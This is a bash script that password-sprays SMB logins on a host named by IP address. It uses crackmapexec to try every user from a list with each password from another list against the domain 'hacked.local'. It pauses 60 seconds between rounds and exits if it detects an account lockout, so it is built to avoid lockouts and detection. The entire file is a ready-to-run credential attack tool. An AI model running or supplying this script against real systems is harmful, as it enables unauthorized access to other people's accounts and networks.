#!/bin/bash

# Set the target IP/domain
target="172.28.33.31"

# Set the domain
domain="hacked.local"

# Initialize cycle and start time
cycle=0
start=$(date +%s)

# Countdown timer
countdown() {
   secs=$1
   while [ $secs -gt 0 ]; do
      echo -ne "Next cycle in: $secs\033[0K\r"
      sleep 1
      : $((secs--))
   done
}

# Get the lists of users and passwords
users=($(cat users.txt))
passwords=($(cat password.txt))

# Iterate over passwords
for password in "${passwords[@]}"; do
    # Iterate over users
    for user in "${users[@]}"; do
        # Run crackmapexec and capture output
        output=$(crackmapexec smb $target -u $user -p $password -d $domain | tee /dev/fd/2)

        # If output contains "STATUS_ACCOUNT_LOCKED_OUT", then exit
        if echo "$output" | grep -q "STATUS_ACCOUNT_LOCKED_OUT"; then
            echo "Account locked out detected for user: $user. Exiting."
            exit 1
        fi
    done

    # Increment the cycle counter
    ((cycle++))

    # Calculate elapsed time
    now=$(date +%s)
    elapsed=$((now - start))
    elapsed_minutes=$((elapsed / 60))

    # Print cycle and time information
    echo "Completed cycle: $cycle"
    echo "Time elapsed: $elapsed_minutes minutes"

    # Sleep for 60 seconds with countdown
    countdown 60
done
